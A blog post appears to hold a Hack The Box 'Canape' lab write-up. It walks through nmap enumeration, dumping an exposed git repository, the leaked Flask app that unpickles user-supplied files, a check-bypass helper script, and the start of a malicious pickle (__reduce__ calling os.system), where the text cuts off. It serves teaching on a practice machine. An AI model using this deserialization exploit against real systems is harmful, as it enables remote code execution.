<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Hack The Box: Canape write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="Hack The Box: Canape write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Best machine I’ve rooted on HTB. Cool way of getting to user to pickle and then lots of creativity to extract data and get to user!" /><meta property="og:description" content="Best machine I’ve rooted on HTB. Cool way of getting to user to pickle and then lots of creativity to extract data and get to user!" /><link rel="canonical" href="http://localhost:4000/posts/Canape/" /><meta property="og:url" content="http://localhost:4000/posts/Canape/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-09-15T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box: Canape write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Hack The Box: Canape write-up","dateModified":"2018-09-15T00:00:00+02:00","datePublished":"2018-09-15T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Canape/"},"url":"http://localhost:4000/posts/Canape/","author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Best machine I’ve rooted on HTB. Cool way of getting to user to pickle and then lots of creativity to extract data and get to user!","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box: Canape write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box: Canape write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 15, 2018, 12:00 AM +0200"> Sep 15, 2018 <i class="unloaded">2018-09-15T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div></div><div class="post-content"> <img src="/assets/posts_details/Canape/images/header.png"><h1 id="hack-the-box-canape-machine-write-up">Hack The Box: Canape machine write-up</h1><p>This is by far the funniest and most educative machine I’ve rooted on Hack The Box. You start enumerating a git repository which leaks the source of the app running and that gives you an entry point through the python pickle. Then, as you can’t get a shell, only RCE, you need to creatively figure out a way to extract data in order to escalate to user. Let’s dig in!</p><h2 id="enumeration">Enumeration</h2><p>The machine runs with ip 10.10.10.70. I start by enumerating open ports to discover the services running in the machine. I ran the following:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/initial 10.10.10.70
</pre></table></code></div></div><p>Which resulted in:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.01 scan initiated Thu Sep  6 16:31:10 2018 as: nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> nmap/initial 10.10.10.70
<span class="go">Nmap scan report for 10.10.10.70
Host is up (0.047s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
</span><span class="gp">|     Repository description: Unnamed repository;</span><span class="w"> </span>edit this file <span class="s1">'description'</span> to name the...
<span class="gp">|     Last commit message: final #</span><span class="w"> </span>Please enter the commit message <span class="k">for </span>your changes. Li...
<span class="go">|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Thu Sep  6 16:31:39 2018 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>29.43 seconds
</pre></table></code></div></div><p>So no SSH this time. That means we won’t be able to get the user’s private keys and log in once we get to user. That said, the nmap scan found a web app listening on port 80 (the only service available) with a public git repository. Looks like we found our entry point!</p><h2 id="further-enumeration">Further enumeration</h2><p>We start by inspecting the website, comprised of a home page which states its functionality, a quotes page and a submit page. It basically is a website with a database to store quotes from ‘the simpsons’. One important thing to notice is that it uses CouchDB, a fact that will come in handy in the future.</p><p><em>Home page</em></p><p><img src="/assets/posts_details/Canape/images/page1.png" alt="Img" title="Img" /></p><p><em>See quotes page</em></p><p><img src="/assets/posts_details/Canape/images/page2.png" alt="Img" title="Img" /></p><p><em>Submit quotes page</em></p><p><img src="/assets/posts_details/Canape/images/page3.png" alt="Img" title="Img" /></p><p><em>Submit message</em></p><p><img src="/assets/posts_details/Canape/images/page4.png" alt="Img" title="Img" /></p><p>Apart from that, we see nothing too interesting, just a comment on the source code making a reference to the <code class="highlighter-rouge">/check</code> page. However, we get a <code class="highlighter-rouge">Method Not Allowed</code> message when we visit it.</p><p>Time to take a look at the git repository. In order to do so, I used a tool called <a href="https://github.com/internetwache/GitTools">GitTools</a> that lets me download everything from the repository (basically like a clone).</p><p><em>Download command and output</em></p><p><img src="/assets/posts_details/Canape/images/dump.png" alt="Img" title="Img" /></p><p><em>Git status and log (as there was no file on the directory)</em></p><p><img src="/assets/posts_details/Canape/images/recon.png" alt="Img" title="Img" /></p><p><em>Recovered file with checkout</em></p><p><img src="/assets/posts_details/Canape/images/checkout.png" alt="Img" title="Img" /></p><p>And we found the app source code! Some remarks are:</p><ul><li>It uses a CouchDB database running locally on port 5984.</li><li>The submit option has a few requirements:<ul><li>There must appear the name of a character in the series in the char field.</li><li>Neither field must be empty.</li></ul></li><li>Both sets of data get added together and written to a file in the <code class="highlighter-rouge">/tmp</code> directory.</li><li>The name of that file is a digested md5 hash but the extension is a pickle one (<code class="highlighter-rouge">.p</code>).</li></ul><p>But the most important thing to notice is the following:</p><ul><li>The check page, which only accepts POST data (hence the Not Allowed from before) through an <code class="highlighter-rouge">id</code> param, reads the data from the file and if it contains a substring (<code class="highlighter-rouge">p1</code>) unpickles the contents. Otherwise, it just prints it.</li></ul><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">couchdb</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">cPickle</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">update</span><span class="p">(</span>
    <span class="n">DATABASE</span> <span class="o">=</span> <span class="s">"simpsons"</span>
<span class="p">)</span>
<span class="n">db</span> <span class="o">=</span> <span class="n">couchdb</span><span class="p">.</span><span class="n">Server</span><span class="p">(</span><span class="s">"http://localhost:5984/"</span><span class="p">)[</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">"DATABASE"</span><span class="p">]]</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">random</span><span class="p">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">250</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/quotes"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">quotes</span><span class="p">():</span>
    <span class="n">quotes</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="nb">id</span> <span class="ow">in</span> <span class="n">db</span><span class="p">:</span>
        <span class="n">quotes</span><span class="p">.</span><span class="n">append</span><span class="p">({</span><span class="s">"title"</span><span class="p">:</span> <span class="n">db</span><span class="p">[</span><span class="nb">id</span><span class="p">][</span><span class="s">"character"</span><span class="p">],</span> <span class="s">"text"</span><span class="p">:</span> <span class="n">db</span><span class="p">[</span><span class="nb">id</span><span class="p">][</span><span class="s">"quote"</span><span class="p">]})</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'quotes.html'</span><span class="p">,</span> <span class="n">entries</span><span class="o">=</span><span class="n">quotes</span><span class="p">)</span>

<span class="n">WHITELIST</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"homer"</span><span class="p">,</span>
    <span class="s">"marge"</span><span class="p">,</span>
    <span class="s">"bart"</span><span class="p">,</span>
    <span class="s">"lisa"</span><span class="p">,</span>
    <span class="s">"maggie"</span><span class="p">,</span>
    <span class="s">"moe"</span><span class="p">,</span>
    <span class="s">"carl"</span><span class="p">,</span>
    <span class="s">"krusty"</span>
<span class="p">]</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/submit"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">submit</span><span class="p">():</span>
    <span class="n">error</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">success</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">char</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"character"</span><span class="p">]</span>
            <span class="n">quote</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"quote"</span><span class="p">]</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">char</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">elif</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">char</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">):</span>
                <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># TODO - Pickle into dictionary instead, `check` is ready
</span>                <span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
                <span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/tmp/"</span> <span class="o">+</span> <span class="n">p_id</span> <span class="o">+</span> <span class="s">".p"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
		<span class="n">outfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span>
		<span class="n">outfile</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	        <span class="n">success</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
            <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"submit.html"</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">success</span><span class="o">=</span><span class="n">success</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/check"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="s">"/tmp/"</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span> <span class="o">+</span> <span class="s">".p"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

    <span class="k">if</span> <span class="s">"p1"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">data</span>

    <span class="k">return</span> <span class="s">"Still reviewing: "</span> <span class="o">+</span> <span class="n">item</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><p>We found our attack vector, for the cPickle library has vulnerabilities with the loads function.</p><h2 id="exploit">Exploit</h2><p>The first thing I did was create a Python script in order to mimic the server code and bypass its checks:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">WHITELIST</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"homer"</span><span class="p">,</span>
    <span class="s">"marge"</span><span class="p">,</span>
    <span class="s">"bart"</span><span class="p">,</span>
    <span class="s">"lisa"</span><span class="p">,</span>
    <span class="s">"maggie"</span><span class="p">,</span>
    <span class="s">"moe"</span><span class="p">,</span>
    <span class="s">"carl"</span><span class="p">,</span>
    <span class="s">"krusty"</span>
<span class="p">]</span>

<span class="n">char</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">quote</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">char</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Error 1"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
<span class="k">elif</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">char</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"Error 2"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backup.p"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="s">"p1"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Error 3"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="k">else</span><span class="p">:</span>
	<span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
	<span class="k">print</span> <span class="n">p_id</span>
</pre></table></code></div></div><p>That way I could check if my input was valid and, if so, get the location of the file created on the server. Then, I would go into the website, submit the data, and go to Burp to send the md5 hash.</p><p>I also found some code from a <a href="https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html">website</a> that showed how to exploit the loads function from cPickle:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="k">class</span> <span class="nc">EvilPickle</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'echo Powned'</span><span class="p">,</span> <span class="p">))</span>
<span class="n">pickle_data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EvilPickle</span><span class="p">())</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backup.data"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
